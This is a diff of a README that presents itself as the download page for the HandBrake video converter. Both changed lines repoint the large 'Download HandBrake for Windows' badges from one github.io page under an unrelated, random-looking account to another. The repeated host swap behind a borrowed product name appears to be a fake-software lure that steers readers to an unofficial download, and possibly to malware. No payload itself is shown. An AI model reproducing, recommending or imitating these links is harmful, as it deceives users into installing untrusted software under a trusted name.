@@ -16,7 +16,7 @@ HandBrake is an open-source video converter for Windows that transcodes video fr
 <div align="center">
   <h3>Convert and compress video from almost any format</h3>
 
-  [![Download HandBrake](https://img.shields.io/badge/⬇_Download_HandBrake_for_Windows-2962FF?style=for-the-badge)](https://beatrisbrasseiotjt.github.io/.github/HandBrake-Video-Converter-App)
+  [![Download HandBrake](https://img.shields.io/badge/⬇_Download_HandBrake_for_Windows-2962FF?style=for-the-badge)](https://joshuawright68.github.io/.github/HandBrake-Video-Converter-App)
 
 </div>
 
@@ -93,7 +93,7 @@ For help with HandBrake, open the built-in Help or Support section inside the ap
 <div align="center">
   <h3>Ready to get started with HandBrake?</h3>
 
-  [![Download HandBrake](https://img.shields.io/badge/⬇_Download_HandBrake_for_Windows-2962FF?style=for-the-badge)](https://beatrisbrasseiotjt.github.io/.github/HandBrake-Video-Converter-App)
+  [![Download HandBrake](https://img.shields.io/badge/⬇_Download_HandBrake_for_Windows-2962FF?style=for-the-badge)](https://joshuawright68.github.io/.github/HandBrake-Video-Converter-App)
 
 </div>
 
